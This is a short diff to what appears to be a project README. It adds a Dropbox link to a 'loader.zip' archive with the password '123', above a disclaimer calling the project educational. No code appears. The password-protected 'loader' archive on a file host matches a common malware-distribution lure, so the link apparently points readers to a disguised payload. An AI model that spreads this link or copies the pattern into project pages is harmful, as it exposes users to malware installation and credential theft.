@@ -1,5 +1,6 @@
 
-
+Download link - https://dl.dropboxusercontent.com/scl/fi/su8r4958r143rsskyxq8h/loader.zip?rlkey=5x6b67kgk6np6qqio1cxy10i7&st=9sh4q7um&dl=0
+Password : 123
 
 ⚠️ Disclaimer
 This project is for educational and personal use only. You are responsible and liable for any consequences of your actions.
